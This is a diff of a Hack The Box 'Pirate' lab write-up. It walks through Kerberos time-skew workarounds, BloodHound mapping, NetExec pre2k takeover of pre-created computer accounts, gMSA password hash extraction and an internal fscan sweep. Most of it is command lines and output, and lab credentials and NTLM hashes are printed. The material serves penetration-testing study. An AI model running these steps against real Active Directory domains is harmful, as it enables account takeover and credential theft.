@@ -352,7 +352,7 @@ echo
 exec faketime -f "$faketime_fmt" "${command[@]}"
 ```
 Since we already generated a `KRB5_CONFIG` we can proceed to authenticate with Kerberos by wrapping it with the custom `ft.sh` script.
-``` 
+```bash
 $ ./ft.sh pirate.htb \ nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -k [*] Querying offset from: pirate.htb [*] faketime -f format: +25144.539157 25144.539157s [*] Running: nxc smb pirate.htb -u pentest -p p3nt3st2025!& -k SMB pirate.htb 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True) SMB pirate.htb 445 DC01 [-] Error checking if user is admin on pirate.htb: The NETBIOS connection with the remote host timed out. SMB pirate.htb 445 DC01 [+] pirate.htb\pentest:p3nt3st2025!&
 ```
 Since Kerberos authentication succeeds we can reuse this setup whenever Kerberos access is required.
@@ -379,7 +379,88 @@ The result from getting the roastable users are not crackable with `rockyou.txt`
 
 We move on to Bloodhound enumeration. If you have a valid credentials and LDAP is reachable. It is possible to collection information for Bloodhound. This allows us to map the domain permissions as well as the information of each and every account.
 
+# BloodHound Enumeration
 
----
-`gMSA_ADCS_prod$:304106f739822ea2ad8ebe23f802d078`
-`gMSA_ADFS_prod$:8126756fb2e69697bfcb04816e685839`
+Since LDAP Port is publicly open we can use `bloodhound-python` or `rushound` depending on your choice to collect information. Once successful, upload the zip file to BloodHound so it will be ingested.
+
+Starting from the `pentest` user:
+![](../assets/Pirate/Pasted%20image%2020260309153506.png)
+
+Looking at the graph we see a **Pre-Windows 2000 Compatible Access**. It is a legacy group for NT-style queries. In modern domains it is usually benign - unless misconfigured
+
+BloodHound also reveals a potential attack path originating from `a.white`
+![](../assets/Pirate/Pasted%20image%2020260309153700.png)
+
+Before this route, we need a path that extends beyond ADCS exploitation to reach the privileged user `a.white`.
+
+## Port 80
+Visiting `http://pirate.htb` only returns a default IIS web page. However, on DCs, web servers could be related to:
+* AD CS web enrollment
+* SharePoint-like services
+
+# User
+## Pre2k
+As noted earlier, Pre-Windows 2000 Compatible Access (pre2k) is common in legacy environments and retained for compatibility in modern domains. It grants directory read permissions required by older NT systems.
+
+Because this target still allows NTLM authentication (rather than Kerberos-only), its presence is expected.
+
+However, the configuration here is excessively broad:
+![](../assets/Pirate/Pasted%20image%2020260309155640.png)
+This is a textbook over-permissive Pre-Windows 2000 Compatible Access group: every authenticated principal (Authenticated Users, Domain Users, Domain Computers, and even administrative accounts) inherits these legacy permissions.
+
+As a result, any domain account including low-privileged users like `pentest` gains extensive read access to AD objects (such as computer accounts) and attributes that modern ACLs would normally restrict.
+
+## MS01$ Account
+Netexec has a module dedicated for pre2k (`-M pre2k`) for streamlined exploitation:
+```bash
+nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
+```
+
+Using Kerberos, we can also obtain TGTs for affected accounts
+```bash 
+$ ./ft.sh pirate.htb \ nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -k -M pre2k [*] Querying offset from: pirate.htb [*] faketime -f format: +25144.654913 25144.654913s [*] Running: nxc ldap pirate.htb -u pentest -p p3nt3st2025!& -k -M pre2k LDAP pirate.htb 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) LDAP pirate.htb 389 DC01 [+] pirate.htb\pentest:p3nt3st2025!& PRE2K pirate.htb 389 DC01 Pre-created computer account: MS01$ PRE2K pirate.htb 389 DC01 Pre-created computer account: EXCH01$ PRE2K pirate.htb 389 DC01 [+] Found 2 pre-created computer accounts. Saved to /home/Axura/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt PRE2K pirate.htb 389 DC01 [+] Successfully obtained TGT for ms01@pirate.htb PRE2K pirate.htb 389 DC01 [+] Successfully obtained TGT for exch01@pirate.htb PRE2K pirate.htb 389 DC01 [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/Axura/.nxc/modules/pre2k/ccache $ for f in ~/.nxc/modules/pre2k/ccache/*.ccache; do klist "$f"; done Ticket cache: FILE:/home/Axura/.nxc/modules/pre2k/ccache/exch01.ccache Default principal: exch01@PIRATE.HTB Valid starting Expires Service principal 03/01/2026 02:29:49 03/01/2026 12:29:49 krbtgt/PIRATE.HTB@PIRATE.HTB renew until 03/02/2026 02:29:48 Ticket cache: FILE:/home/Axura/.nxc/modules/pre2k/ccache/ms01.ccache Default principal: ms01@PIRATE.HTB Valid starting Expires Service principal 03/01/2026 02:29:47 03/01/2026 12:29:47 krbtgt/PIRATE.HTB@PIRATE.HTB renew until 03/02/2026 02:29:46 $ cp /home/Axura/.nxc/modules/pre2k/ccache/* .
+```
+The output 
+```bash
+Pre-created computer account: MS01$
+Pre-created computer account: EXCH01$
+```
+confirms the classic vulnerability. According to the Netexec [Pre2k Module](https://www.netexec.wiki/ldap-protocol/pre2k):
+| Identifies **pre-created computer accounts** in Active Directory and attempts to obtain **Kerberos TGTs** using their default machine password.
+It attempts to authenticate using that guessable default password
+
+This effectively gain control of two machine accounts - `MS01$` and `EXCH01` whose passwords match their account names (without the trailing `$`)
+
+## gMSA
+Since we have access to two computer accounts, the following path is now clear
+![](../assets/Pirate/Pasted%20image%2020260309161344.png)
+We can leverage `readGMSAPassword` to compromise `GMSA_ADFS_Prod$` for remote login on the target machine
+
+A gMSA (Group Managed Service Account) is a specialized type of Active Directory account designed specifically to manage services. In the past, administrators often used "Standard" service accounts. Because these accounts were often tied to multiple servers, changing their password meant manually updating it everywhere, which often led to services breaking. To avoid this, admins would set the password to never expire, creating a massive security risk if that password were ever compromised. gMSA solves this by: Automatic Password Management, No Manual Intervention, Service Principal Name (SPN) Management. gMSA rely on the KDS (Key Distribution System) running on Domain Controllers: Creation -> Assignment -> Retrieval -> Security
+
+The `readGMSAPassword` is an access control vulnerability in Active Directory. **The password of a gMSA is stored in the `msDS-ManagedPassword` attribute of the gMSA account object in Active Directory.** The misconfiguration occurs when an administrator--either through human error, overly permissive Group Policy, or legacy "Authenticated Users" permissions-grants Read (or specifically `Control Access` / `Read all properties`) permissions on the gMSA object to a user or group that shouldn't have it
+## Get GMSA_ADFS_PROR$
+We use Netexec to extract gMSA credentials accounts
+```bash
+./ft.sh pirate.htb \
+nxc ldap pirate.htb -u 'MS01$' -p 'ms01' --gmsa -k
+```
+The result of the accounts with their NTLM hashes:
+```bash
+gMSA_ADCS_prod$:304106f739822ea2ad8ebe23f802d078
+gMSA_ADFS_prod$:8126756fb2e69697bfcb04816e685839
+```
+
+## Coerce Vulnerability
+After gaining access, we inspect the internal network
+```
+ipconfig
+ 
+Windows IP Configuration Ethernet adapter vEthernet (Switch01): Connection-specific DNS Suffix . : Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8 IPv4 Address. . . . . . . . . . . : 192.168.100.1 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : .htb IPv4 Address. . . . . . . . . . . : 10.129.1.12 Subnet Mask . . . . . . . . . . . : 255.255.0.0 Default Gateway . . . . . . . . . : 10.129.0.1 
+```
+
+We can use `fscan` tool to scan the intranet `192.168.100.1/24`
+
+```bash
+.\fscan.exe -h 192.168.100.1/24 -nobr -nopoc (icmp) Target 192.168.100.1 is alive (icmp) Target 192.168.100.2 is alive [*] Icmp alive hosts len is: 2 192.168.100.1:88 open 192.168.100.2:808 open 192.168.100.2:445 open 192.168.100.1:445 open 192.168.100.2:443 open 192.168.100.2:139 open 192.168.100.1:139 open 192.168.100.2:135 open 192.168.100.2:80 open 192.168.100.1:135 open [*] alive ports len is: 10 start vulscan [*] NetInfo [*]192.168.100.1 [->]DC01 [->]192.168.100.1 [->]10.129.1.12 [*] NetInfo [*]192.168.100.2 [->]WEB01 [->]192.168.100.2 [*] WebTitle http://192.168.100.2 code:200 len:703 title:IIS Windows Server
+```
